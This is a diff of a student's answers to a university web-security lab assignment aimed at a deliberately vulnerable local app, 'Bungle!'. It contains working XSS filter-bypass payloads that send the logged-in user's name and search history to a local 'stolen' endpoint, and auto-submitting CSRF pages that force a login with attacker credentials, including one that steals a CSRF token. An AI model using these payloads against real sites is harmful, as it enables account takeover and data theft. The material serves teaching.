@@ -2,10 +2,10 @@ COSC 480B Assignment #3: Web Security
 
 Due Date: 11/9/20 at 5:00pm ET
 
-You may work with a partner on this assignment. 
+You may work with a partner on this assignment.
 Only one person partnership needs to submit.
 
-Reminder: You may NOT work with the same partner on multiple assignments. 
+Reminder: You may NOT work with the same partner on multiple assignments.
 
 
 NAMES: [Full Names of both partners]
@@ -27,15 +27,15 @@ Part 1: Cross-site Scripting (XSS)
 	1.1) Remove "script"
 
 		http://0.0.0.0:8080/search?xssdefense=1&q=%3Cimg%20src%3D%22x.gif%22%20onerror%3Dwindow.location.href%3Durl%3D%22http%3A%2F%2Flocalhost%3A31337%2Fstolen%3Fuser%3D%22%2Bdocument.getElementById%28%22logged-in-user%22%29.innerText%2B%22%26last_search%3D%22%2Bdocument.getElementsByClassName%28%22list-group-item%22%29%5B1%5D.innerText%3E
-		
+
 		or
 
 		localhost:8080/search?xssdefense=1&q=%3Cimg%20src%3D%22x.gif%22%20onerror%3Dwindow.location.href%3Durl%3D%22http%3A%2F%2Flocalhost%3A31337%2Fstolen%3Fuser%3D%22%2Bdocument.getElementById%28%22logged-in-user%22%29.innerText%2B%22%26last_search%3D%22%2Bdocument.getElementsByClassName%28%22list-group-item%22%29%5B1%5D.innerText%3E
 
-	1.2) Remove several tags 
+	1.2) Remove several tags
 
 		http://0.0.0.0:8080/search?xssdefense=2&q=<scrscriptipt>document.addEventListener%28%22DOMContentLoaded%22%2C%20function%28%29%7Bvar%20url%20%3D%20%22http%3A%2F%2Flocalhost%3A31337%2Fstolen%3Fuser%3D%22%20%2B%20document.getElementById%28%22logged-in-user%22%29.innerText%20%2B%20%22%26last_search%3D%22%20%2B%20document.getElementsByClassName%28%22history-item%20list-group-item%22%29%5B1%5D.innerText%3B%20window.location.href%3Durl%7D%2Cfalse%29%3B</scrscriptipt>
-		
+
 		or
 
 		localhost:8080/search?xssdefense=2&q=<scrscriptipt>document.addEventListener%28%22DOMContentLoaded%22%2C%20function%28%29%7Bvar%20url%20%3D%20%22http%3A%2F%2Flocalhost%3A31337%2Fstolen%3Fuser%3D%22%20%2B%20document.getElementById%28%22logged-in-user%22%29.innerText%20%2B%20%22%26last_search%3D%22%20%2B%20document.getElementsByClassName%28%22history-item%20list-group-item%22%29%5B1%5D.innerText%3B%20window.location.href%3Durl%7D%2Cfalse%29%3B</scrscriptipt>
@@ -61,14 +61,40 @@ Part 2: Cross-site Request Forgery (CSRF)
 	2.0) No defense. Target URL: http://0.0.0.0:8080/login?csrfdefense=0&xssdefense=4
 
 		<html>
-			TODO
-		</html>
+            <head>
+                <title>Safe site</title>
+            </head>
+		   <body>
+                <form action="http://0.0.0.0:8080/login?csrfdefense=0&xssdefense=4" method="POST">
+                    <input id="username" name="username" type="text" value="attacker" required >
+                    <input id="userpass" name="password" type="password" value="URpwn3d" required >
+                </form>
+                <script>
+                    document.forms[0].submit();
+                </script>
+           </body>
+        </html>
 
 
 	2.1) Token validation (with XSS). Target URL: http://0.0.0.0:8080/login?csrfdefense=1&xssdefense=0
 
 		<html>
 			TODO
+            <head>
+                <title>Safe site</title>
+            </head>
+            <body>
+                <form id=“fake” action="http://0.0.0.0:8080/login?csrfdefense=0&xssdefense=4" method="POST">
+                    <input id="username" name="username" type="text" value="attacker" required >
+                    <input id="userpass" name="password" type="password" value="URpwn3d" required >
+                </form>
+            </body>
+            <script>
+		            var token = document.querySelector('[name="csrf_token"]').value;
+		            var str = "<input type='hidden' name='csrf_token' value='" + token +"'>";
+	                document.querySelector("#fake").innerHTML += str;
+                    document.getElementById("fake").submit();
+            </script>
 		</html>
 
 
@@ -94,23 +120,23 @@ ________________________________________________________________________________
 Part 4: Better Defenses
 
 
-	4.1) Briefly describe how you implemented password salting and hashing 
+	4.1) Briefly describe how you implemented password salting and hashing
 
 		TODO
-		
+
 
 	4.2) Briefly describe the changes you made to database.py to prevent SQL injection attacks
 
 		TODO
 
 
-	4.3) In 1-2 paragraphs, provide some advice to the Bunglers about how they should 
+	4.3) In 1-2 paragraphs, provide some advice to the Bunglers about how they should
 	     strengthen Bungle!'s defenses to prevent XSS attacks
 
 		TODO
 
 
-	4.4) In 1-2 paragraphs, provide some advice to the Bunglers about how they should 
+	4.4) In 1-2 paragraphs, provide some advice to the Bunglers about how they should
 	     strengthen Bungle!'s defenses to prevent CSRF attacks
 
 	     	TODO
